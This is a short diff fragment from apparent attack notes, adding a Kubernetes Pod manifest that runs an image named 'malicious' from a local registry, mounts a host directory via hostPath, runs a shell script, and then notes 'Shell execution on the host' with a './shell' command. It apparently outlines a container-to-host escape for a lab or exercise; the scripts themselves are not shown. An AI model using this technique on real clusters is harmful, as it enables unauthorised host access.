@@ -31,4 +31,27 @@ docker push localhost:5000/malicious
 
 ####################################################
 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: security
+spec:
+  containers:
+  - name: security
+    image: localhost:5000/malicious
+    volumeMounts:
+    - name:storage
+      mountPath: /shared
+    command: ["/bin/sh"]
+    args: ["shellscript.sh"]
+  volumes:
+  - name: storage
+    hostPath:
+      path: /tmp/shared
+      type: Directory
+
+####################################################
+# Shell execution on the host
+
+./shell
 
